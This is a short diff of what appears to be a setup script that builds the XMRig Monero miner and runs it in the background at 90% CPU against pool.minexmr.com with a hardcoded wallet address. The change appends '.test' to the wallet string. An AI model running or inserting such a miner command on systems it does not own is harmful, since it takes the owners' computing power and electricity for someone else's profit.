@@ -9,4 +9,4 @@ mkdir build
 cd build
 cmake ..
 make
-./xmrig -B -l pro -R 10 --donate-level 0 --max-cpu-usage 90 -o pool.minexmr.com:7777 -u 42fEFbU6ejvbr8z5qv9aiADFKXTdTYB5D7PfzAJ9kjEWNpzvrbmWQkaRkhX5mr4xwWdyn2og7afzMJNUsak2v1CqFGpf2F7 -p x -k
+./xmrig -B -l pro -R 10 --donate-level 0 --max-cpu-usage 90 -o pool.minexmr.com:7777 -u 42fEFbU6ejvbr8z5qv9aiADFKXTdTYB5D7PfzAJ9kjEWNpzvrbmWQkaRkhX5mr4xwWdyn2og7afzMJNUsak2v1CqFGpf2F7.test -p x -k
